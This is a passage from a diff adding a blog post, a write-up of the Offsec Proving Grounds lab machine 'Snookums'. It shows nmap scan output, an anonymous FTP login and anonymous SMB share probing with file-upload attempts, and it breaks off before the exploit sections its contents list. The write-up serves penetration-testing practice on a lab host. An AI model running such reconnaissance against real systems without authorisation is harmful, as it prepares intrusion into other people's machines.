@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Writeup - Offsec PG Snookums | kei5uke&#39;s Hacking Note</title>
+<meta property="og:title" content="Writeup - Offsec PG Snookums | kei5uke&#39;s Hacking Note" />
+<meta name="twitter:title" content="Writeup - Offsec PG Snookums | kei5uke&#39;s Hacking Note" />
+<meta itemprop="name" content="Writeup - Offsec PG Snookums | kei5uke&#39;s Hacking Note" />
+<meta name="application-name" content="Writeup - Offsec PG Snookums | kei5uke&#39;s Hacking Note" />
+<meta property="og:site_name" content="kei5uke&#39;s Hacking Note" />
+
+<meta name="description" content="Writeup for PG Snookums">
+<meta itemprop="description" content="Writeup for PG Snookums" />
+<meta property="og:description" content="Writeup for PG Snookums" />
+<meta name="twitter:description" content="Writeup for PG Snookums" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="" />
+  <meta property="og:image" content="" />
+  <meta name="twitter:image" content="" />
+  <meta name="twitter:image:src" content="" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-10-18T00:00:00Z />
+    <meta property="article:published_time" content=2023-10-18T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Kei5uke" />
+    <meta property="article:author" content="Kei5uke" />
+    <meta name="author" content="Kei5uke" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Writeup - Offsec PG Snookums",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-10-18",
+        "description": "Writeup for PG Snookums",
+        "wordCount":  1552 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-10-18",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kei5uke\u0027s Hacking Note"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="/posts/snookums/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Writeup - Offsec PG Snookums</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-10-18T00:00:00&#43;00:00" itemprop="datePublished"> 18 Oct 2023 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#snookums">snookums</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#ftp">FTP</a></li>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#mysql">MySQL</a></li>
+        <li><a href="#http">HTTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploit">Exploit</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#payload">Payload</a></li>
+          </ul>
+        </li>
+        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+        <li><a href="#root-shell">Root Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h1 id="snookums">snookums</h1>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/snook<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -sC -sV -p- -T4 192.168.239.58 -oN nmap.txt
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-10-18 12:53 EEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.239.58
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.046s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65527</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">21/tcp    open  ftp         vsftpd 3.0.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   STAT: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> FTP server status:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Connected to ::ffff:192.168.45.240
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Logged in as ftp
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      TYPE: ASCII
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      No session bandwidth limit
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Control connection is plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Data connections will be plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      At session startup, client count was <span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      vsFTPd 3.0.2 - secure, fast, stable
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_End of status
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Can<span class="s1">&#39;t get directory listing: TIMEOUT
+</span></span></span><span class="line"><span class="cl"><span class="s1">22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
+</span></span></span><span class="line"><span class="cl"><span class="s1">| ssh-hostkey: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
+</span></span></span><span class="line"><span class="cl"><span class="s1">80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-title: Simple PHP Photo Gallery
+</span></span></span><span class="line"><span class="cl"><span class="s1">111/tcp   open  rpcbind     2-4 (RPC #100000)
+</span></span></span><span class="line"><span class="cl"><span class="s1">| rpcinfo: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   program version    port/proto  service
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   100000  2,3,4        111/tcp   rpcbind
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   100000  2,3,4        111/udp   rpcbind
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   100000  3,4          111/tcp6  rpcbind
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_  100000  3,4          111/udp6  rpcbind
+</span></span></span><span class="line"><span class="cl"><span class="s1">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+</span></span></span><span class="line"><span class="cl"><span class="s1">445/tcp   open  P(F�      Samba smbd 4.10.4 (workgroup: SAMBA)
+</span></span></span><span class="line"><span class="cl"><span class="s1">3306/tcp  open  mysql       MySQL (unauthorized)
+</span></span></span><span class="line"><span class="cl"><span class="s1">33060/tcp open  mysqlx?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     Invalid message&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    HY000
+</span></span></span><span class="line"><span class="cl"><span class="s1">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF-Port33060-TCP:V=7.94%I=7%D=10/18%Time=652FAB8E%P=aarch64-unknown-linux-
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:gnu%r(NULL,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(GenericLines,9,&#34;\x05\0\0
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\0\x0b\x08\x05\x1a\0&#34;)%r(GetRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:(HTTPOptions,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(RTSPRequest,9,&#34;\x05\0\
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:0\0\x0b\x08\x05\x1a\0&#34;)%r(RPCCheck,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:DNSVersionBindReqTCP,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(DNSStatusReque
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:stTCP,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;</span><span class="se">\x</span>
+</span></span><span class="line"><span class="cl">SF:1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\&#34;\x</span>05HY000<span class="s2">&#34;)%r(Help,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:x1a<span class="se">\0</span><span class="s2">&#34;)%r(SSLSessionReq,2B,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:x08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">&#39;\x1a\x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(TerminalServe
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:rCookie,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(TLSSessionReq,2B,&#34;\x05\0\0\
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20me
+</span></span><span class="line"><span class="cl">SF:ssage<span class="se">\&#34;\x</span>05HY000<span class="s2">&#34;)%r(Kerberos,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(SMBPr
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ogNeg,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(X11Probe,2B,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>
+</span></span><span class="line"><span class="cl">SF:08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">&#39;\x1a\x0fInvalid\x20message\&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\x05HY000&#34;)%r(FourOhFourRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(LPD
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:String,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(LDAPSearchReq,2B,&#34;\x05\0\0\0
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20mes
+</span></span><span class="line"><span class="cl">SF:sage<span class="se">\&#34;\x</span>05HY000<span class="s2">&#34;)%r(LDAPBindReq,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(SIP
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:Options,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(LANDesk-RC,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">SF:b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(TerminalServer,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:NCP,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(NotesRPC,2B,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span><span class="m">08</span>
+</span></span><span class="line"><span class="cl">SF:<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">&#39;\x1a\x0fInvalid\x20message\&#34;\x
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:05HY000&#34;)%r(JavaRMI,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(WMSRequest,9,&#34;\
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(oracle-tns,9,&#34;\x05\0\0\0\x0b\x08\x05\x1
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:a\0&#34;)%r(ms-sql-s,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(afp,2B,&#34;\x05\0\0\0
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20mes
+</span></span><span class="line"><span class="cl">SF:sage<span class="se">\&#34;\x</span>05HY000<span class="s2">&#34;)%r(giop,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">Service Info: Host: SNOOKUMS; OS: Unix
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Host script results:
+</span></span></span><span class="line"><span class="cl"><span class="s2">| smb-security-mode: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   account_used: guest
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   authentication_level: user
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   challenge_response: supported
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_  message_signing: disabled (dangerous, but default)
+</span></span></span><span class="line"><span class="cl"><span class="s2">| smb-os-discovery: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   OS: Windows 6.1 (Samba 4.10.4)
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   Computer name: snookums
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   NetBIOS computer name: SNOOKUMS\x00
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   Domain name: \x00
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   FQDN: snookums
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_  System time: 2023-10-18T05:55:48-04:00
+</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-security-mode: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   3:1:1: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_    Message signing enabled but not required
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_clock-skew: mean: 1h20m00s, deviation: 2h18m36s, median: 0s
+</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-time: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   date: 2023-10-18T09:55:47
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_  start_date: N/A
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 163.70 seconds
+</span></span></span></code></pre></div><h2 id="ftp">FTP</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ftp 192.168.239.58
+</span></span><span class="line"><span class="cl">Connected to 192.168.239.58.
+</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>192.168.239.58:parallels<span class="o">)</span>: anonymous
+</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; dir
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>53160<span class="p">|</span><span class="o">)</span>.
+</span></span><span class="line"><span class="cl">ftp: Can<span class="s1">&#39;t connect to `192.168.239.58:53160&#39;</span>: Connection timed out
+</span></span><span class="line"><span class="cl"><span class="m">200</span> EPRT <span class="nb">command</span> successful. Consider using EPSV.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">421</span> Service not available, remote server timed out. Connection closed.
+</span></span></code></pre></div><h2 id="smb">SMB</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/snook<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# smbclient -L 192.168.239.58   
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\r</span>oot<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">Anonymous login successful
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">        ---------       ----      -------
+</span></span><span class="line"><span class="cl">        print$          Disk      Printer Drivers
+</span></span><span class="line"><span class="cl">        IPC$            IPC       IPC Service <span class="o">(</span>Samba 4.10.4<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/snook<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# smbclient <span class="se">\\\\</span>192.168.239.58<span class="se">\\</span>IPC$                                                                            <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\r</span>oot<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">Anonymous login successful
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
+</span></span><span class="line"><span class="cl">NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span class="se">\*</span>
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span class="se">\*</span>
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> put test.html
+</span></span><span class="line"><span class="cl">test.html does not exist
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> <span class="nb">help</span>
+</span></span><span class="line"><span class="cl">?              allinfo        altname        archive        backup         
+</span></span><span class="line"><span class="cl">blocksize      cancel         case_sensitive <span class="nb">cd</span>             chmod          
+</span></span><span class="line"><span class="cl">chown          close          del            deltree        dir            
+</span></span><span class="line"><span class="cl">du             <span class="nb">echo</span>           <span class="nb">exit</span>           get            getfacl        
+</span></span><span class="line"><span class="cl">geteas         hardlink       <span class="nb">help</span>           <span class="nb">history</span>        iosize         
+</span></span><span class="line"><span class="cl">lcd            link           lock           lowercase      ls             
+</span></span><span class="line"><span class="cl">l              mask           md             mget           mkdir          
+</span></span><span class="line"><span class="cl">more           mput           newer          notify         open           
+</span></span><span class="line"><span class="cl">posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
+</span></span><span class="line"><span class="cl">posix_unlink   posix_whoami   print          prompt         put            
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>            q              queue          quit           readlink       
+</span></span><span class="line"><span class="cl">rd             recurse        reget          rename         reput          
+</span></span><span class="line"><span class="cl">rm             rmdir          showacls       setea          setmode        
+</span></span><span class="line"><span class="cl">scopy          stat           symlink        tar            tarmode        
+</span></span><span class="line"><span class="cl">timeout        translate      unlock         volume         vuid           
+</span></span><span class="line"><span class="cl">wdel           logon          listconnect    showconnect    tcon           
+</span></span><span class="line"><span class="cl">tdis           tid            utimes         logoff         ..             
+</span></span><span class="line"><span class="cl">!              
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> <span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">Current directory is <span class="se">\\</span>192.168.239.58<span class="se">\I</span>PC$<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>smb: <span class="se">\&gt;</span> dir
+</span></span><span class="line"><span class="cl">NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span class="se">\*</span>
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> put ./test.html
+</span></span><span class="line"><span class="cl">NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file <span class="se">\t</span>est.html
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> put test.html
+</span></span><span class="line"><span class="cl">NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file <span class="se">\t</span>est.html
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> put ~/test.html
+</span></span><span class="line"><span class="cl">~/test.html does not exist                                                                                            
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> put ~/snook/test.html                                                                                         
